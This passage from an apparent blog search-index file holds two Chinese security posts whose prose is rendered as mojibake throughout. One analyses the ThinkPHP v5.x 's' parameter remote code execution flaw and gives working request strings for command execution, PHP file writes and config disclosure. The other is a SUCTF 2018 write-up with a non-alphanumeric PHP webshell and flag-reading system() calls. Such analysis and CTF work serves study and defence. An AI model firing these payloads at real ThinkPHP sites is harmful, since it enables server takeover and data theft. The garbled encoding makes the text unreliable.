8i3loZ9bCMZwQ17Lf"},{"title":"„ÄêCode Analysis„Äëthinkphp v5.x App.php sÂèÇÊï∞RCE","permalink":"http://blog.0kami.cn/2019/02/05/php-thinkphp-v5-x-App-php-rce/","text":"Ê¶ÇËø∞ÊîæÂÅá‰∫ÜÔºåÂØπthinkphpÁöÑÂá†‰∏™RCEÂÅö‰∏Ä‰∏ãÂàÜÊûêÔºåËÆ∞ÂΩï‰∏Ä‰∏ãXD thinkphp v5.0.xÊºèÊ¥ûÁõ∏ÂÖ≥‰ø°ÊÅØÊºèÊ¥ûÁâàÊú¨Ôºö&lt;= 5.0.22Ë°•‰∏ÅÔºöÁâàÊú¨Êõ¥Êñ∞ ¬∑ top-think/framework@4cbc0b5 ¬∑ GitHubÈóÆÈ¢òÁÇπÔºölibrary/think/App.php ÊºèÊ¥ûÂàÜÊûêÂÖ≥‰∫éthinkphpÁöÑurlËß£ÊûêÊñπÂºèTHINKPHPÊîØÊåÅ‰ΩøÁî®PATHINFOÁöÑÊñπÂºèÊù•ËÆøÈóÆÂÖ∑‰ΩìÁöÑÊ®°Âùó„ÄÅÁ±ª„ÄÅÊñπÊ≥ïÔºåÂ¶Çindex.php/module/controller/actionÂØπ‰∫é‰∏çÊîØÊåÅPATHINFOÁöÑÊúçÂä°Âô®ÔºåTHINKPHPÊèê‰æõ‰∫ÜÂÖºÂÆπÊ®°Âºè?s=/module/controller/actionÁöÑÊñπÂºèÊù•ËÆøÈóÆËÄåËøôÊ¨°ÁöÑÊºèÊ¥ûÊàêÂõ†Â∞±ÊòØÂú®‰∫éÂÖºÂÆπÊ®°ÂºèÂ§ÑÁêÜÊó∂Â≠òÂú®ÁöÑÈóÆÈ¢ò„ÄÇÈ¶ñÂÖàÁúã thinkphp/library/think/Request.phpÁöÑpathinfoÂáΩÊï∞ 123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // Âà§Êñ≠URLÈáåÈù¢ÊòØÂê¶ÊúâÂÖºÂÆπÊ®°ÂºèÂèÇÊï∞ $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLIÊ®°Âºè‰∏ã index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // ÂàÜÊûêPATHINFO‰ø°ÊÅØ ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; ÂΩìGETËØ∑Ê±Ç‰∏≠Â∏¶ÊúâsÂèÇÊï∞(config‰∏≠ÈªòËÆ§var_pathinfo‰∏∫s)ÔºåÂ∞ÜpathinfoËÆæÁΩÆ‰∏∫sÁöÑÂèÇÊï∞ÂÄºÊúâ‰∫ÜpathinfoÂÄºÔºåÊàë‰ª¨ÂÜçÊâæÂà∞ÂÖ∑‰ΩìÁöÑËß£ÊûêurlÁöÑÂáΩÊï∞Ôºåthinkphp/library/think/Route.phpÁöÑparseUrlÂáΩÊï∞123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // Â¶ÇÊûúÊúâÊ®°Âùó/ÊéßÂà∂Âô®ÁªëÂÆö $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; ÂÖ∂‰∏≠parseUrlÂáΩÊï∞ÁöÑ$url‰∏∫‰∏äÈù¢ÊãøÂà∞ÁöÑpathinfoÔºå$depr‰∏∫ÈªòËÆ§ÁöÑÂàÜÂâ≤Á¨¶È¶ñÂÖàÂØπ$urlÊõøÊç¢ÂàÜÂâ≤Á¨¶‰∏∫|ÔºåÂÜçËæìÂÖ•Âà∞parseUrlPathÂáΩÊï∞(Ê†πÊçÆ/ÂàÜÂâ≤)ÔºåËØ•ÂáΩÊï∞ÂØπpathinfoËøõË°åÂàÜÂâ≤Ôºå‰∫ßÁîümodule„ÄÅcontroller„ÄÅactionÈÇ£‰πàÁé∞Âú®Êù•ÁúãrceÁöÑPoc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]ÂÖ∂‰∏≠controller=&gt;\\think\\appÔºåÊòØphpÂëΩÂêçÁ©∫Èó¥ÁöÑË°®Á§∫ÊñπÂºèÔºå\\think\\appÂÆûÈôÖË∞ÉÁî®library/think/App.phpÔºåÂêéÈù¢ÁöÑactionÂÆûÈôÖË∞ÉÁî®ÁöÑApp.php‰∏≠ÁöÑinvokefunctionÂáΩÊï∞ ÊºèÊ¥ûÊàêÂõ†ÁÇπ‰∏äÈù¢ÂàÜÊûê‰∫ÜthinkphpÁöÑÂÖºÂÆπÊ®°ÂºèÊòØÂ¶Ç‰ΩïÂ§ÑÁêÜsÂèÇÊï∞ÁöÑÔºåÂπ∂‰∏îÂ§ÑÁêÜÂ≠òÂú®‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØÂèØ‰ª•‰º™ÈÄ†controllerÔºåÂØºËá¥ÂÆûÈôÖË∞ÉÁî®‰∏∫ÂÖ∂‰ªñÁöÑÁ±ªÂíåÂáΩÊï∞Áúã‰∏Ä‰∏ãÊãøÂà∞module„ÄÅcontroller„ÄÅactionÂêéÁ≥ªÁªüÁöÑÂ§ÑÁêÜthinkphp/library/think/App.php ÁöÑ moduleÂáΩÊï∞1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // ËÆæÁΩÆÈªòËÆ§ËøáÊª§Êú∫Âà∂ $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// ÂÆû‰æãÂåñcontrollerÁ±ª $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // Ëé∑ÂèñÂΩìÂâçÊìç‰ΩúÂêç $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // ÊâßË°åÊìç‰ΩúÊñπÊ≥ï $call = [$instance, $action]; // ‰∏•Ê†ºËé∑ÂèñÂΩìÂâçÊìç‰ΩúÊñπÊ≥ïÂêç $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // Á©∫Êìç‰Ωú $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // Êìç‰Ωú‰∏çÂ≠òÂú® throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// Ë∞ÉÁî®ÂáΩÊï∞&#125; ÊãøÂà∞ÂÆû‰æãÂåñÂêéÁöÑÂØπË±°ÂíåÊñπÊ≥ïÔºåÂä®ÊÄÅË∞ÉÁî®invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // ÈùôÊÄÅÊñπÊ≥ï $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// Ëé∑ÂèñÂèÇÊï∞ÂÜÖÂÆπ ËøôÈáåËé∑ÂèñÂà∞ÂèÇÊï∞Áî®ÂÅömethodÁöÑÂèÇÊï∞ËæìÂÖ• self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; ËøôÈáå‰ΩøÁî®bindParamsÂáΩÊï∞‰ªégetÊàñpost‰∏≠Ëé∑ÂèñÂà∞ÂØπÂ∫îÁöÑÂÜÖÂÆπÔºåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÂÅöÂèÇÊï∞ÂµåÂÖ•Êó∂ÔºåÈúÄË¶Å‰ª•ÂáΩÊï∞ÁöÑÂèÇÊï∞Âêç‰∏∫ÈîÆÂ¶ÇinvokeFunctionÁöÑÂèÇÊï∞‰∏∫$function„ÄÅ$varsÔºåÈÇ£‰πàÂú®ÂèÇÊï∞‰∏≠Â∞±ÈúÄË¶Å‰ª•function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxxÂç≥pocÁöÑÂêéÂçäÈÉ®ÂàÜfunction=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-lÊâÄ‰ª•Ë∞ÉÁî®ÈìæÁé∞Âú®ÂèòÊàê‰∫Ü Âä®ÊÄÅË∞ÉÁî®\\think\\app invokeFunctionÂáΩÊï∞ Êèê‰æõfunction=call_user_func_array‰Ωú‰∏∫invokeFunctionÂä®ÊÄÅË∞ÉÁî®ÁöÑÂèÇÊï∞ÔºåÊâÄ‰ª•‰∏ã‰∏ÄÊ≠•Ë∞ÉÁî®call_user_func_arrayÂáΩÊï∞ call_user_func_arrayÁöÑÂèÇÊï∞‰∏∫systemÂáΩÊï∞ÔºåsystemÂáΩÊï∞ÁöÑÂèÇÊï∞‰∏∫ls -lÔºåÊâÄ‰ª•ËøôÈáåÁî®‰∫Ü2Áª¥Êï∞ÁªÑ ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂèëÊï£‰∏Ä‰∏ãÊÄùÁª¥ÔºåÊàë‰ª¨ÂÖ∂ÂÆû‰∏çÂçïÂçïÂèØ‰ª•Ë∞ÉÁî®\\think\\appËøô‰∏™Á±ªÔºåÂ¶ÇÊûúÂÖ∂‰ªñÁöÑÁ±ªÂèØ‰ª•‰ªªÊÑèË∞ÉÁî®ÂÖ∂‰ªñÂáΩÊï∞ÔºåÊàñËÄÖÊòØË∞ÉÁî®ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÂêåÊ†∑ÂÖ∑ÊúâÂç±ÂÆ≥ÊÄßÂ¶Ç‰ªªÊÑèÂëΩ‰ª§ÊâßË°å?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÔºåÁîüÊàêÂú®index.phpÂêå‰∏ÄÁ∫ßÁõÆÂΩï?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();Ëé∑ÂèñÈÖçÁΩÆ‰ø°ÊÅØ?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.xÁâàÊú¨‰ø°ÊÅØÁâàÊú¨Ôºö&lt;= v5.1.30Ë°•‰∏Å‰ø°ÊÅØÔºö‰øÆÊ≠£ÊéßÂà∂Âô®Ë∞ÉÁî® ¬∑ top-think/framework@802f284 ¬∑ GitHubÊºèÊ¥ûÁÇπÔºöthinkphp/library/think/route/dispatch/Module.php ÊºèÊ¥ûÂàÜÊûêÂéüÁêÜÂêåv5.0.xÁâàÊú¨Á±ª‰ººÔºå‰πüÊòØÁî±‰∫ésÂèÇÊï∞Â∏¶ÂÖ•ÁöÑË∑ØÂæÑËß£ÊûêÂ≠òÂú®ÂÆâÂÖ®ÈóÆÈ¢òÂØºËá¥ÁöÑ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÂÖàÁúãApp::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // ÂàùÂßãÂåñÂ∫îÁî® $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // Ë∑ØÁî±Ê£ÄÊµã $dispatch = $this-&gt;routeCheck()-&gt;init();// Â§ÑÁêÜmodule„ÄÅcontroller„ÄÅaction &#125; // ËÆ∞ÂΩïÂΩìÂâçË∞ÉÂ∫¶‰ø°ÊÅØ $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// Âä®ÊÄÅË∞ÉÁî®controller„ÄÅaction ... return $response;&#125; App::run()ÂáΩÊï∞‰ΩìÁé∞‰∫ÜÁ®ãÂ∫èÁöÑ‰∏Ä‰∏™‰∏ªË¶ÅÊµÅÁ®ãÔºå‰ªéË∑ØÂæÑÁöÑËß£ÊûêÂà∞Âä®ÊÄÅËß£ÊûêÊâßË°åÁõ∏Â∫îÁöÑÊéßÂà∂Âô®ÂèäÊñπÊ≥ïÂÖàÊù•ÁúãÁúãÁ¨¨13Ë°åÔºåËé∑ÂèñÁõ∏Â∫îÁöÑË∑ØÂæÑ‰ø°ÊÅØthinkphp/library/think/App.php routeCheck()ÂáΩÊï∞1234567891011121314151617181920public function routeCheck()&#123; // Ê£ÄÊµãË∑ØÁî±ÁºìÂ≠ò ... // Ëé∑ÂèñÂ∫îÁî®Ë∞ÉÂ∫¶‰ø°ÊÅØ $path = $this-&gt;request-&gt;path(); // ‰ªéRequest.php pathÊèêÂèñurlpath ÂÖ∑‰Ωì‰ªépathinfo()Ôºå‰ºòÂÖàËé∑Âèñ$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo ÈªòËÆ§‰∏∫s // ÊòØÂê¶Âº∫Âà∂Ë∑ØÁî±Ê®°Âºè $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // Ë∑ØÁî±Ê£ÄÊµã ËøîÂõû‰∏Ä‰∏™DispatchÂØπË±° $dispatch = $this-&gt;route-&gt;check($path, $must);//ËøîÂõûUrlDispatchÁ±ªÂÆû‰æãÔºå‰ªédispatchÁ±ªÂ§ÑÁªßÊâø ... return $dispatch;&#125; Á¨¨7Ë°å‰ªésÂèÇÊï∞‰∏≠Ëé∑ÂèñË∑ØÁî±Ë∑ØÂæÑ(s‰∏∫var_pathinfoÁöÑÈªòËÆ§ÂÄº)ÔºåÂú®Ë∞ÉÁî®routeCheckÂáΩÊï∞ÂêéËøîÂõû‰∏Ä‰∏™UrlDispatchÔºå‰πãÂêéË∞ÉÁî®‰∫ÜUrlÁ±ªÁöÑinitÂáΩÊï∞thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // Ëß£ÊûêÈªòËÆ§ÁöÑURLËßÑÂàô $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrlÂáΩÊï∞Â§ÑÁêÜÂèÇÊï∞ÂÄº(‰ª•/ÂàÜÂâ≤Ôºå‰º†ÂÖ•|‰πüË°å‰ºöË¢´ÊõøÊç¢Êàê/ÔºåÊúÄÁªàÁî±/Êù•ÂàÜÂâ≤)ÔºåËøîÂõû[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; ËøîÂõûModuleÂØπË±°ÔºåÁªßÊâøËá™DispatchÂØπË±°ÔºåÂπ∂‰∏îË∞ÉÁî®‰∫ÜinitÂáΩÊï∞ÔºåÂ∞ÜËß£ÊûêÂêéÁöÑË∑ØÁî±Â°´ÂÖÖÂà∞dispatchÔºå‰æõÂêéÈù¢App::run()ÂáΩÊï∞Âä®ÊÄÅË∞ÉÁî®dispatchÁöÑrunÂáΩÊï∞Ôºåv5.1ÁâàÊú¨ÁöÑË∞ÉÁî®ÈìæÂ§çÊùÇ‰∫Ü‰∏ÄÁÇπÔºå‰ΩÜÊòØÂÖ∂ÂÆûÂÜÖÂÆπÂêåv5.0ÁâàÊú¨Á±ª‰ººDispatch::run()ÂáΩÊï∞Ë∞ÉÁî®‰∫ÜModule::exec()ÂáΩÊï∞thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // ÁõëÂê¨module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // ÂÆû‰æãÂåñÊéßÂà∂Âô® $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // Èó≠ÂåÖË∞ÉÁî® $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // Ëé∑ÂèñÂΩìÂâçÊìç‰ΩúÂêç $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig('action_suffix'); if (is_callable([$instance, $action])) &#123; // ÊâßË°åÊìç‰ΩúÊñπÊ≥ï $call = [$instance, $action]; // ‰∏•Ê†ºËé∑ÂèñÂΩìÂâçÊìç‰ΩúÊñπÊ≥ïÂêç $reflect = new ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $this-&gt;rule-&gt;getConfig('action_suffix'); $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $this-&gt;request-&gt;setAction($actionName); // Ëá™Âä®Ëé∑ÂèñËØ∑Ê±ÇÂèòÈáè $vars = $this-&gt;rule-&gt;getConfig('url_param_type') ? $this-&gt;request-&gt;route() : $this-&gt;request-&gt;param(); $vars = array_merge($vars, $this-&gt;param); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // Á©∫Êìç‰Ωú $call = [$instance, '_empty']; $vars = [$this-&gt;actionName]; $reflect = new ReflectionMethod($instance, '_empty'); &#125; else &#123; // Êìç‰Ωú‰∏çÂ≠òÂú® throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; $this-&gt;app['hook']-&gt;listen('action_begin', $call); $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars); return $this-&gt;autoResponse($data); &#125;); return $this-&gt;app['middleware']-&gt;dispatch($this-&gt;request, 'controller');&#125; ÁÆÄÂçïÊèèËø∞execÂáΩÊï∞ÔºåÂÆû‰æãÂåñcontrollerÔºåÁî®‰∫éÂêéÈù¢20Ë°åÂà∞55Ë°åÁöÑÈó≠ÂåÖÂáΩÊï∞ÔºåËøô‰∏™ÂøÖÊä•ÂáΩÊï∞‰∏ªË¶ÅÂÆåÊàê‰∫ÜË∞ÉÁî®controllerÁöÑactionÔºåÂπ∂Ëé∑ÂèñËæìÂÖ•ÁöÑÂèÇÊï∞ÂÄºÔºåÊúÄÂêéÁî±invokeReflectMethodÂÆåÊàê‰∏ªË¶ÅÁöÑË∞ÉÁî®„ÄÇÊúÄÁªàÁöÑË∞ÉÁî®ÂáΩÊï∞‰∏∫Request::filterValueÂáΩÊï∞123456789101112131415161718192021222324252627282930private function filterValue(&amp;$value, $key, $filters)&#123; $default = array_pop($filters); foreach ($filters as $filter) &#123; if (is_callable($filter)) &#123; // Ë∞ÉÁî®ÂáΩÊï∞ÊàñËÄÖÊñπÊ≥ïËøáÊª§ $value = call_user_func($filter, $value);//Ë∞ÉÁî®ÂáΩÊï∞ &#125; elseif (is_scalar($value)) &#123; if (false !== strpos($filter, '/')) &#123; // Ê≠£ÂàôËøáÊª§ if (!preg_match($filter, $value)) &#123; // ÂåπÈÖç‰∏çÊàêÂäüËøîÂõûÈªòËÆ§ÂÄº $value = $default; break; &#125; &#125; elseif (!empty($filter)) &#123; // filterÂáΩÊï∞‰∏çÂ≠òÂú®Êó∂, Âàô‰ΩøÁî®filter_varËøõË°åËøáÊª§ // filter‰∏∫ÈùûÊï¥ÂΩ¢ÂÄºÊó∂, Ë∞ÉÁî®filter_idÂèñÂæóËøáÊª§id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) &#123; $value = $default; break; &#125; &#125; &#125; &#125; return $value;&#125; Âà∞ËøôÈáåÂÖ∂ÂÆûÊÄùË∑ØÂæàÊòéÊòæÔºåÂà©Áî®/ÂàÜÂâ≤Âá∫ËÉΩÂà©Áî®ÁöÑcontrollerÔºåÂπ∂ËæìÂÖ•Áõ∏Â∫îÁöÑÂèÇÊï∞ÂÄºÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊâæÂèØÂà©Áî®ÁöÑÂáΩÊï∞„ÄÇv5.0ÁâàÊú¨‰∏≠pocÈÉΩËÉΩÁî® Â¶Ç‰ªªÊÑèÂëΩ‰ª§ÊâßË°å?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÔºåÁîüÊàêÂú®index.phpÂêå‰∏ÄÁ∫ßÁõÆÂΩï?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();Ëé∑ÂèñÈÖçÁΩÆ‰ø°ÊÅØ?s=index/\\think\\config/get&amp;name=database.usernameÈô§Ê≠§‰πãÂ§ñÔºåËøòÂèØ‰ª•‰ΩøÁî®\\think\\request/inputÔºàv5.0ÁâàÊú¨‰∏çËÉΩÁî®ÊòØÂõ†‰∏∫think\\requestÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏∫protectedÔºå‰∏çÂÖÅËÆ∏Âä®ÊÄÅË∞ÉÁî®ÔºâÂ¶Ç‰ªªÊÑè‰ª£Á†ÅÊâßË°å?s=index/\\think\\request/input&amp;data[]=123&amp;filter=phpinfoinvokeFunctionÊ†∏ÂøÉReflectionFunction?s=index/\\think\\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1?s=index/\\think\\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1Âõ†‰∏∫think\\appÁªßÊâøËá™think\\containerÔºåÊâÄ‰ª•ÊîπÊàêthink\\app‰πüË°åÂÖ∂‰∏≠call_user_funcÂ°´ÂÖÖÂèÇÊï∞Êó∂Ôºå‰ª•Êï∞ÁªÑÂΩ¢ÂºèÔºåÁ¨¨‰∏Ä‰∏™‰∏∫ÂáΩÊï∞ÂêçÔºåÁ¨¨‰∫å‰∏™‰∏∫ÂáΩÊï∞ÂèÇÊï∞call_user_func_arrayÂ°´ÂÖÖÂèÇÊï∞Êó∂Ôºå‰ª•Êï∞ÁªÑÂΩ¢ÂºèÔºåÁ¨¨‰∏Ä‰∏™‰∏∫ÂáΩÊï∞ÂêçÔºåÁ¨¨‰∫å‰∏™‰∏∫ÂáΩÊï∞ÂèÇÊï∞Ôºà‰πü‰∏∫Êï∞ÁªÑÂΩ¢ÂºèÔºâËøôÈáåv5.1Âè™ËÉΩÁî®php7ÔºåÂ¶Çv5.0ËøòÂèØ‰ª•‰ΩøÁî®assertÊù•ÊâßË°åÂáΩÊï∞ ÊÄªÁªìËøôÊ¨°Âá∫ÁöÑËøô‰∏™ÊºèÊ¥ûÂç±ÂÆ≥ÂæàÂ§ßÔºåÊï¥‰∏™Ë∞ÉÁî®ËøáÁ®ã‰πüÈùûÂ∏∏ÊºÇ‰∫ÆÔºåÂÄºÂæó‰∏ÄÊ≠•‰∏ÄÊ≠•Ë∞ÉËØï„ÄÇÂÖ∂‰∏≠Êî∂Ëé∑Â§ßËá¥Â∞±ÊòØ‰∫ÜËß£‰∫Üthinkphp v5ÁâàÊú¨Ë∑ØÁî±Ë∞ÉÁî®ÁöÑÊµÅÁ®ãÔºåv5.1ÁâàÊú¨ÁöÑÈó≠ÂåÖÂáΩÊï∞ÊûÑÈÄ†ÁöÑÊñπÂºèÁªôÊ°ÜÊû∂Â∏¶Êù•‰∫Ü‰∏ç‰∏ÄÊ†∑ÁöÑÊÑüÂèóÔºå‰∏çÂæó‰∏çÁªôthinkphp‰∏Ä‰∏™Ëµû"},{"title":"„ÄêCTF„ÄëSUCTF 2018 ÈÉ®ÂàÜweb writeup","permalink":"http://blog.0kami.cn/2018/05/28/ctf/suctf-part-web-writeup/","text":"SUCTFÊäΩ‰∫ÜÁÇπÊó∂Èó¥ÂÅö‰∫Ü2ÈÅìSUCTFÁöÑwebÈ¢òÔºåËÆ∞ÂΩï‰∏Ä‰∏ãwriteup„ÄÇ AnonymousËÄÉÁÇπphpÁöÑÂä®ÊÄÅÂáΩÊï∞ÊâßË°åÔºå‰ª•Âèäcreate_functionÊâÄËøîÂõûÁöÑÂåøÂêçÂáΩÊï∞ wpËÆøÈóÆÈ¢òÁõÆÔºåÁõ¥Êé•Áªô‰∫ÜÊ∫êÁ†Å12345678910$MY = create_function(&quot;&quot;,&quot;some code&quot;); // ÊâßË°å‰∫ÜcatÂëΩ‰ª§ÔºåËØªÂèñflagÂÜÖÂÆπ$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125; ÊÄùË∑ØÊØîËæÉÊòéÁ°ÆÔºåÂ∞±ÊòØÊÉ≥ÂäûÊ≥ïÊâßË°åcreate_functionÊâÄ‰∫ßÁîüÁöÑÂåøÂêçÂáΩÊï∞„ÄÇËÄåÂÖ∂‰∏≠SUCTF_32ÔºåËøô‰∏™ÂáΩÊï∞ÊòéÁ°ÆÊòØÊ≤°ÂäûÊ≥ïÁàÜÁ†¥Âá∫Êù•ÁöÑ„ÄÇÈÇ£‰πàÂ∞±Âè™ËÉΩÂú® $MY ‰∏ä‰∏ãÂäüÂ§´„ÄÇÊâìÂç∞‰∏Ä‰∏ã$MYÁöÑÂÄºÔºåÂèëÁé∞create_functionËøîÂõû‰∫Ü\\0lambda_{number},ÈÇ£‰πàÂ∞±ÂæàÊòéÁ°Æ‰∫ÜÔºåÂè™Ë¶ÅÊö¥Âäõ‰∏Ä‰∏ãËøô‰∏™numberÂ∞±Êúâ‰∏ÄÂÆöÂá†ÁéáÊâßË°åËØ•ÂáΩÊï∞ÔºåËøôÈáåÊàëÊö¥Âäõ‰∫ÜÂ§ßÊ¶Ç1000Â§öÂ∞±Êúâ2Êù°ÊâßË°å‰∫Ü GetshellËÄÉÁÇπhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html wp È¶ñÂÖàÁ°ÆÂÆöÂèØÁî®Â≠óÁ¨¶Ôºå‰ΩøÁî®bpÂ∞ÜÊâÄÊúâÂèØËßÅÂ≠óÁ¨¶Êö¥Âäõ‰∏ÄÈÅçÂêéÂèëÁé∞ÂèØÊâìÂç∞Â≠óÁ¨¶‰∏∫$ () [] _ ~ . ; =Ôºå‰ª•ÂèäÂÖ∂‰ªñ‰∏çÂèØÊâìÂç∞Â≠óÁ¨¶„ÄÇ Ê†πÊçÆpÁâõÁöÑÂçöÂÆ¢ÔºåÂèëÁé∞ÂèñÂèç‰∏≠ÊñáÂèØ‰ª•Ëµ∑Âà∞‰ΩúÁî®ÔºåÊµãËØï~({‰∏≠Êñá})ÂèëÁé∞ÂèØÊ†πÊçÆ‰∏≠ÊñáÁöÑutf-8ÁºñÁ†ÅÁöÑ‰∏≠Èó¥2‰∏™hexÁ†ÅËøõË°åÂØπÂ≠óÊØçÁöÑÈÅçÂéÜhttp://www.herongyang.com/gb2312_gb/pinyin_32.html ÂáëÂá∫Â≠óÁ¨¶assertÔºå_GETÔºåÂπ∂Âä®ÊÄÅÊâßË°å„ÄÇ‰∏∫‰∫ÜÂáëÂá∫‰∏äÈù¢ÁöÑÂ≠óÁ¨¶ÔºåÊàëÈááÁî®ÈÄê‰∏™ÂèçÂèñÂèçbin2hex(~(&#39;a&#39;))Ëé∑Âæó‰∏≠Êñáutf-8ÁºñÁ†ÅÁöÑ‰∏≠Èó¥2‰∏™ÔºåÊêúË°®Âç≥ÂèØÊâæÂà∞ÂØπÂ∫îÁöÑ‰∏≠ÊñáÔºåÂÜô‰∏Ä‰∏ãÊàëÁöÑgetshell‰ª£Á†Å 123456789101112131415161718192021222324&lt;?php$_=~(Áûé);$__.=$_[[]==[]];$_=~(Êåü);$__.=$_[[]==[]];$_=~(Êåü);$__.=$_[[]==[]];$_=~(Èöô);$__.=$_[[]==[]];$_=~(Âç∏);$__.=$_[[]==[]];$_=~(Âãã);$__.=$_[[]==[]];$_=~(Ê†°);$___.=$_[[]==[]];$_=~(‰∏ã);$___.=$_[[]==[]];$_=~(Á∫§);$___.=$_[[]==[]];$_=~(Â´å);$___.=$_[[]==[]];$___=$$___;$__($___[_]); ‰∏ä‰º†‰∫Üshell‰πãÂêéÂ∞±ÊØîËæÉÂÆπÊòì‰∫ÜÔºåÁøªÁõÆÂΩïÂç≥ÂèØ 12system(&apos;ls /&apos;)system(&apos;cat /Th1s_14_f14g&apos;) ÊÄªÁªìËÆ∞ÂΩï‰∏Ä‰∏ãgetshellÁöÑÂùëÁÇπ eval‰∏çÊòØÂáΩÊï∞ÔºåÊòØËØ≠Âè• ‰∏çÁî®ÂºïÂè∑ÔºåÁî®‰∏≠Êñá‰πüË¢´phpÂΩì‰ΩúÊòØÂ≠óÁ¨¶‰∏≤ UTF-8ÁºñÁ†Å http://www.herongyang.com/gb2312_gb/pinyin_32.html"},{"title":"„ÄêCTF„ÄëDDCTF 2018 web 